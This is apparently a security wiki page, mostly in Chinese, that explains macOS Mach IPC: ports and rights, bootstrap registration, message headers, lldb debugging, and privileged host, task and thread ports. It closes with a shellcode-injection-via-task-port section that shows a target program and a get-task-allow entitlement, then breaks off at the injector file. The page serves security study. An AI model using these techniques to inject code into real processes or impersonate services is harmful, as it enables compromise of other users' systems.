# macOS IPC - 进程间通信

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### 基本信息

Mach 使用 **任务 (tasks)** 作为共享资源的 **最小单位**，每个任务可以包含 **多个线程**。这些 **任务和线程与 POSIX 进程和线程 1:1 映射**。

任务之间通过 Mach Inter-Process Communication (IPC) 进行通信，使用单向通信通道。**消息在端口之间传递**，端口由内核管理，起到类似 **消息队列** 的作用。

一个 **port** 是 Mach IPC 的 **基本**要素。它可以用于 **发送和接收消息**。

每个进程都有一个 **IPC 表**，可以在其中找到该进程的 **mach ports**。mach port 的名称实际上是一个数字（指向内核对象的指针）。

一个进程也可以将一个 port 名称连同某些权限 **发送到另一个任务**，内核会在 **另一个任务的 IPC 表** 中创建相应条目。

### Port Rights

Port rights（定义任务可以执行哪些操作）是此通信的关键。可能的 **port rights** 如下（[definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：

- **Receive right**，允许接收发送到该端口的消息。Mach ports 是 MPSC（multiple-producer, single-consumer）队列，这意味着在整个系统中对每个端口最多只能有 **一个 Receive right**（不同于 pipe，多个进程可以持有同一个 pipe 的读取端文件描述符）。
- 持有 **Receive** 权利的任务可以接收消息并 **创建 Send rights**，从而允许它发送消息。通常只有 **拥有者任务** 对其端口拥有 Receive right。
- 如果拥有 Receive right 的任务 **终止** 或者释放该权利，则 **send right 变为无效（dead name）**。
- **Send right**，允许向该端口发送消息。
- Send right 可以被 **克隆**，因此持有 Send right 的任务可以克隆该权限并 **授予第三方任务**。
- 注意 **port rights** 也可以通过 Mach 消息被 **传递**。
- **Send-once right**，允许向端口发送一次消息然后消失。
- 该权限 **不能** 被 **克隆**，但可以被 **移动**。
- **Port set right**，表示一个 _port set_ 而不是单个端口。从 port set 中出队消息时，会从其包含的某个端口中出队一条消息。Port sets 可用于同时监听多个端口，类似于 Unix 中的 `select`/`poll`/`epoll`/`kqueue`。
- **Dead name**，并不是实际的 port right，而只是一个占位符。当端口被销毁时，所有指向该端口的现有 port rights 会变为 dead names。

**Tasks 可以将 SEND rights 转移给其他任务**，使其能够发送回复。**SEND rights 也可以被克隆，所以一个任务可以复制并将该权限给第三方**。结合一个称为 **bootstrap server** 的中间进程，这使任务之间能够有效通信。

### File Ports

File ports 允许将文件描述符封装到 Mac ports（使用 Mach port rights）。可以使用 `fileport_makeport` 从给定 FD 创建一个 `fileport`，并使用 `fileport_makefd` 从 fileport 创建一个 FD。

### 建立通信

如前所述，可以使用 Mach 消息发送权限，但你 **不能在没有已有发送 Mach 消息权限的情况下发送一个 right**。那么，首次通信是如何建立的？

为此，涉及到 **bootstrap server**（mac 中为 **launchd**），因为 **任何人都可以获得指向 bootstrap server 的 SEND right**，因此可以请求它为发送消息到另一个进程的权限：

1. 任务 **A** 创建一个 **新端口**，获得该端口的 **RECEIVE right**。
2. 任务 **A**，作为 RECEIVE right 的持有者，**为该端口生成一个 SEND right**。
3. 任务 **A** 与 **bootstrap server** 建立 **连接**，并 **将它生成的 SEND right 发送给 bootstrap server**。
- 记住，任何人都可以获得指向 bootstrap server 的 SEND right。
4. 任务 A 向 bootstrap server 发送 `bootstrap_register` 消息，将给定端口 **与诸如 com.apple.taska 之类的名称关联**。
5. 任务 **B** 与 **bootstrap server** 交互，对服务名称执行 bootstrap **lookup** (`bootstrap_lookup`)。为了让 bootstrap server 能够响应，任务 B 会在 lookup 消息中向它发送 **一个它先前创建的端口的 SEND right**。如果 lookup 成功，**server 会复制从任务 A 接收到的 SEND right 并将其传给任务 B**。
- 记住，任何人都可以获得指向 bootstrap server 的 SEND right。
6. 有了这个 SEND right，**任务 B** 就能够 **向任务 A 发送消息**。
7. 为了实现双向通信，通常任务 **B** 会生成一个带有 **RECEIVE** 权利和 **SEND** 权利的新端口，并将 **SEND right 赋予任务 A**，以便任务 A 可以向任务 B 发送消息（双向通信）。

bootstrap server **无法对任务所声称的服务名称进行认证**。这意味着某个 **任务** 可能会 **冒充任何系统任务**，例如冒充授权服务名称并随后批准所有请求。

因此，Apple 将 **系统提供的服务名称** 存储在受保护的配置文件中，位于受 SIP 保护的目录：`/System/Library/LaunchDaemons` 和 `/System/Library/LaunchAgents`。在每个服务名称旁边，也存储着 **关联的二进制**。bootstrap server 会为这些服务名称创建并保留一个 **RECEIVE right**。

对于这些预定义服务，**lookup 过程略有不同**。当查找服务名称时，launchd 会动态启动该服务。新的工作流程如下：

- 任务 **B** 发起对某个服务名称的 bootstrap **lookup**。
- **launchd** 检查该服务是否正在运行，如果没有则 **启动** 它。
- 任务 **A**（即服务）执行 **bootstrap check-in**（`bootstrap_check_in()`）。在这里，**bootstrap** server 会创建一个 SEND right 并保留它，同时 **将 RECEIVE right 转移到任务 A**。
- launchd 会复制该 **SEND right 并将其发送给任务 B**。
- 任务 **B** 会生成一个带有 **RECEIVE** 权利和 **SEND** 权利的新端口，并将 **SEND right 赋予任务 A**（该服务），以便其可以向任务 B 发送消息（双向通信）。

然而，该过程仅适用于预定义的系统任务。非系统任务仍按最初描述的方式操作，这可能会允许冒充。

> [!CAUTION]
> 因此，launchd 不应崩溃，否则整个系统将崩溃。

### A Mach Message

[更多信息请见](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` 函数，本质上是一个系统调用，用于发送和接收 Mach 消息。该函数要求将要发送的消息作为第一个参数。该消息必须以 `mach_msg_header_t` 结构开始，随后是实际的消息内容。该结构定义如下：
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
拥有 _**receive right**_ 的进程可以在 Mach port 上接收消息。相反，**senders** 被授予 _**send**_ 或 _**send-once right**_。send-once right 专用于发送单条消息，发送后即失效。

初始字段 **`msgh_bits`** 是一个位图：

- 第 1 位（最高有效位）用于指示消息为复杂（下文详述）
- 第 3 位和第 4 位由 kernel 使用
- **第 2 字节的最低 5 位** 可用于 **voucher**：另一种用于发送键/值组合的端口类型。
- **第 3 字节的最低 5 位** 可用于 **local port**
- **第 4 字节的最低 5 位** 可用于 **remote port**

voucher、local 和 remote port 中可以指定的类型有（来自 [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)）：
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.

例如，`MACH_MSG_TYPE_MAKE_SEND_ONCE` 可用于**指示**应为该端口派生并转移一个**send-once** **right**。也可以指定 `MACH_PORT_NULL` 以防止接收方能够回复。

In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message.

为了实现简单的**双向通信**，进程可以在 mach **message header** 中指定一个称为 _reply port_（**`msgh_local_port`**）的**mach port**，消息的**接收方**可以向该端口**发送回复**。

> [!TIP]
> Note that this kind of bi-directional communication is used in XPC messages that expect a replay (`xpc_connection_send_message_with_reply` and `xpc_connection_send_message_with_reply_sync`). But **usually different ports are created** as explained previously to create the bi-directional communication.

> [!TIP]
> 注意，这种双向通信用于期望回复的 XPC 消息（`xpc_connection_send_message_with_reply` 和 `xpc_connection_send_message_with_reply_sync`）。但**通常会如前所述创建不同的端口**来实现双向通信。

The other fields of the message header are:

消息头的其他字段是：

- `msgh_size`: the size of the entire packet.
- `msgh_remote_port`: the port on which this message is sent.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: the ID of this message, which is interpreted by the receiver.

- `msgh_size`：整个数据包的大小。
- `msgh_remote_port`：发送该消息的端口。
- `msgh_voucher_port`：[mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html)。
- `msgh_id`：该消息的 ID，由接收方解释。

> [!CAUTION]
> Note that **mach messages are sent over a `mach port`**, which is a **single receiver**, **multiple sender** communication channel built into the mach kernel. **Multiple processes** can **send messages** to a mach port, but at any point only **a single process can read** from it.

> [!CAUTION]
> 注意，**mach messages are sent over a `mach port`**，它是内置于 mach kernel 的**单接收者**、**多发送者**通信通道。**多个进程**可以向 mach port **发送消息**，但在任意时刻只有**单个进程可以读取**。

Messages are then formed by the **`mach_msg_header_t`** header followed by the **body** and by the **trailer** (if any) and it can grant permission to reply to it. In these cases, the kernel just need to pass the message from one task to the other.

消息由 **`mach_msg_header_t`** 头部组成，后跟 **body** 和（如果有）**trailer**，并且它可以授予对该消息的回复权限。在这些情况下，内核只需将消息从一个 task 传递到另一个。

A **trailer** is **information added to the message by the kernel** (cannot be set by the user) which can be requested in message reception with the flags `MACH_RCV_TRAILER_<trailer_opt>` (there is different information that can be requested).

**trailer** 是**由内核添加到消息的信息**（不能由用户设置），可以在接收消息时使用标志 `MACH_RCV_TRAILER_<trailer_opt>` 请求（可请求不同的信息）。

#### Complex Messages

#### 复杂消息

However, there are other more **complex** messages, like the ones passing additional port rights or sharing memory, where the kernel also needs to send these objects to the recipient. In this cases the most significant bit of the header `msgh_bits` is set.

但是，还有其他更**复杂**的消息，比如传递额外端口权限或共享内存的消息，在这些情况下内核也需要将这些对象发送给接收方。在这种情况下，会设置头部 `msgh_bits` 的最高有效位。

The possible descriptors to pass are defined in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):

可以传递的描述符定义在 [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)：
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
在 32 位下，所有描述符都是 12B，且描述符类型位于第 11 个位置。在 64 位下，大小会有所不同。

> [!CAUTION]
> 内核会把描述符从一个 task 复制到另一个，但在此之前会先在内核内存中**创建一份副本**。这种技术，称为 "Feng Shui"，已在多个利用中被滥用，使得内核将数据**复制到其内存**中，从而让进程把描述符发送给它自己。然后该进程可以接收这些消息（内核会释放它们）。
>
> 也可以将**port 权限发送给易受攻击的进程**，这些 port 权限会直接出现在该进程中（即使它没有处理它们）。

### Mac Ports APIs

注意：ports 与 task namespace 关联，所以在创建或搜索 port 时，也会查询 task namespace（详见 `mach/mach_port.h`）：

- **`mach_port_allocate` | `mach_port_construct`**：**创建**一个 port。
- `mach_port_allocate` 还可以创建一个 **port set**：对一组 ports 的 receive 权利。每当接收到消息时，会指出消息来自哪个 port。
- `mach_port_allocate_name`：改变 port 的名称（默认是 32bit integer）
- `mach_port_names`：从目标获取 port 名称
- `mach_port_type`：获取某个 task 在某个名称上的权限
- `mach_port_rename`：重命名 port（类似于 FD 的 dup2）
- `mach_port_allocate`：分配一个新的 RECEIVE、PORT_SET 或 DEAD_NAME
- `mach_port_insert_right`：在你拥有 RECEIVE 的 port 中创建一个新的 right
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**：用于**发送和接收 mach 消息**的函数。overwrite 版本允许为消息接收指定不同的缓冲区（另一版本会重用同一缓冲区）。

### Debug mach_msg

由于 **`mach_msg`** 和 **`mach_msg_overwrite`** 用于发送和接收消息，在它们上设置断点可以检查发送和接收的消息。

例如，启动你能够调试的任意应用程序进行调试，它会加载 **`libSystem.B`，该库会使用此函数**。

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

要获取 **`mach_msg`** 的参数，请检查寄存器。以下是这些参数（来自 [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)）：
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
从注册表获取值：
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
检查消息头，验证第一个参数：
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
这种 `mach_msg_bits_t` 类型非常常见，用来允许回复。

### 枚举端口
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
该 **名称** 是分配给端口的默认名称（检查其在前三个字节中如何**递增**）。`ipc-object` 是端口的**混淆**的唯一**标识符**。\
还注意只有 **`send`** 权限的端口如何**标识其所有者**（端口名称 + pid）。\
还注意使用 **`+`** 来表示**连接到同一端口的其他任务**。

也可以使用 [**procesxp**](https://www.newosxbook.com/tools/procexp.html) 来查看**已注册的服务名称**（由于需要 `com.apple.system-task-port`，需禁用 SIP）：
```
procesp 1 ports
```
你可以从 [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) 下载此工具并在 iOS 上安装。

### 代码示例

注意 **发送者** 如何 **分配** 一个端口，为名称 `org.darlinghq.example` 创建一个 **send right** 并将其发送到 **bootstrap server**，同时 **发送者** 请求该名称的 **send right** 并用它来 **发送消息**。

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## 特权端口

有一些特殊端口，如果某个任务对它们具有 **SEND** 权限，就可以**执行某些敏感操作或访问某些敏感数据**。这使得这些端口从攻击者的角度非常有吸引力，不仅因为这些能力，还因为可以**在任务之间共享 SEND 权限**。

### Host Special Ports

这些端口由一个数字表示。

**SEND** 权限可以通过调用 **`host_get_special_port`** 获得，**RECEIVE** 权限通过调用 **`host_set_special_port`** 获得。然而，这两个调用都需要 **`host_priv`** 端口，而只有 root 可以访问。此外，过去 root 能够调用 **`host_set_special_port`** 并任意 hijack，这例如允许通过 hijack `HOST_KEXTD_PORT` 来绕过代码签名（SIP 现在阻止了这种情况）。

这些端口分为两组：**前 7 个端口由内核拥有**，分别是第 1 个 `HOST_PORT`、第 2 个 `HOST_PRIV_PORT`、第 3 个 `HOST_IO_MASTER_PORT`，第 7 个是 `HOST_MAX_SPECIAL_KERNEL_PORT`。\
从数字 **8** 开始的端口由 **系统守护进程** 拥有，它们可以在 [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html) 中找到声明。

- **Host port**: 如果进程对该端口具有 **SEND** 权限，则可以通过调用其例程获取有关 **系统** 的**信息**，例如：
- `host_processor_info`: Get processor info
- `host_info`: Get host info
- `host_virtual_physical_table_info`: Virtual/Physical page table (requires MACH_VMDEBUG)
- `host_statistics`: Get host statistics
- `mach_memory_info`: Get kernel memory layout
- **Host Priv port**: 拥有该端口 **SEND** 权限的进程可以执行**特权操作**，例如显示启动数据或尝试加载内核扩展。**进程需要是 root** 才能获得此权限。
- 此外，为了调用 **`kext_request`** API，需要具有其他权限 **`com.apple.private.kext*`**，这些权限仅授予 Apple 的二进制文件。
- 其他可调用的例程包括：
- `host_get_boot_info`: Get `machine_boot_info()`
- `host_priv_statistics`: Get privileged statistics
- `vm_allocate_cpm`: Allocate Contiguous Physical Memory
- `host_processors`: 将 SEND 权限授予主机处理器
- `mach_vm_wire`: Make memory resident
- 由于 **root** 可以访问此权限，它可以调用 `host_set_[special/exception]_port[s]` 来 hijack host special or exception ports。

可以通过运行以下命令来**查看所有主机特殊端口**：
```bash
procexp all ports | grep "HSP"
```
### 任务特殊端口

这些端口是为知名服务保留的。可以通过调用 `task_[get/set]_special_port` 来获取/设置它们。它们可以在 `task_special_ports.h` 中找到：
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
摘自 [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: 用于控制该任务的端口。用于发送影响该任务的消息。该端口由 **mach_task_self (see Task Ports below)** 返回。
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: 任务的 bootstrap 端口。用于发送请求以返回其他系统服务端口的消息。
- **TASK_HOST_NAME_PORT**\[host-self send right]: 用于请求包含该任务的主机信息的端口。该端口由 **mach_host_self** 返回。
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: 指示该任务从何处获取其 wired kernel 内存来源的端口名称。
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: 指示该任务从何处获取其默认托管内存的端口名称。

### Task Ports

最初 Mach 没有“processes”，而是有更像线程容器的“tasks”。当 Mach 与 BSD 合并时，**每个 task 都与一个 BSD 进程关联**。因此每个 BSD 进程拥有成为进程所需的细节，而每个 Mach task 也有其内部工作机制（除了不存在的 pid 0，即 `kernel_task`）。

有两个非常有意思的函数与此相关：

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: 获取与指定 `pid` 相关的 task 的 task port 的 SEND 权限，并将其给予指定的 `target_task_port`（通常是使用 `mach_task_self()` 的调用者任务，但也可以是跨其他任务的 SEND 端口）。
- `pid_for_task(task, &pid)`: 给定对某个 task 的 SEND 权限，查找该 task 对应的 PID。

为了在任务内执行操作，任务需要对自身调用 `mach_task_self()` 来获得一个 `SEND` 权限（该调用使用 `task_self_trap` (28)）。有了这个权限，任务可以执行多种操作，例如：

- `task_threads`: 获取对该任务的所有线程的 task ports 的 SEND 权限
- `task_info`: 获取关于任务的信息
- `task_suspend/resume`: 挂起或恢复任务
- `task_[get/set]_special_port`
- `thread_create`: 创建线程
- `task_[get/set]_state`: 控制任务状态
- 更多内容见 [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> 注意：如果对一个 **不同任务** 的 task port 拥有 SEND 权限，就可以对该不同任务执行上述操作。

此外，task_port 还是 **`vm_map`** 端口，允许使用诸如 `vm_read()` 和 `vm_write()` 等函数在任务内 **读取和操纵内存**。这基本上意味着，对另一个任务的 task_port 拥有 SEND 权限的任务将能够 **向该任务注入代码**。

请记住，由于 **kernel 也是一个 task**，如果有人设法获得对 **`kernel_task`** 的 **SEND 权限**，就能让内核执行任意代码（用于 jailbreak）。

- 调用 `mach_task_self()` 来为调用者任务 **获取该端口的名称**。该端口仅在 **`exec()`** 时 **继承**；使用 `fork()` 创建的新任务会获得新的 task port（特殊情况：在 suid 二进制的 `exec()` 后，任务也会获得新的 task port）。在执行 `fork()` 时，产生任务并获取其端口的唯一方法是执行 [“port swap dance”](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html)。
- 以下是访问该端口的限制（来自二进制 `AppleMobileFileIntegrity` 中的 `macos_task_policy`）：
  - 如果应用具有 **`com.apple.security.get-task-allow` entitlement**，则同一用户下的进程可以访问该 task port（通常由 Xcode 为调试添加）。**notarization** 过程不会允许它用于生产发布。
  - 具有 **`com.apple.system-task-ports`** entitlement 的应用可以获取任何进程的 task port（内核除外）。在早期版本中称为 **`task_for_pid-allow`**。此权限仅授予 Apple 的应用。
  - **Root 可以访问** 未使用 **hardened** runtime 编译（且非 Apple 应用）的应用的 task ports。

**The task name port:** 一个无权限的 _task port_ 版本。它引用任务，但不允许控制它。通过它似乎唯一可用的是 `task_info()`。

### Thread Ports

线程也有相关的端口，可通过调用 **`task_threads`** 的任务或处理器上的 `processor_set_threads` 查看。对线程端口的 SEND 权限允许使用来自 `thread_act` 子系统的函数，例如：

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

任何线程都可以调用 **`mach_thread_sef`** 来获取该端口。

### Shellcode Injection in thread via Task port

你可以从下面获取一个 shellcode：


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compile** 之前的程序并添加 **entitlements** 以便能够以相同用户注入代码（否则需要使用 **sudo**）。

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
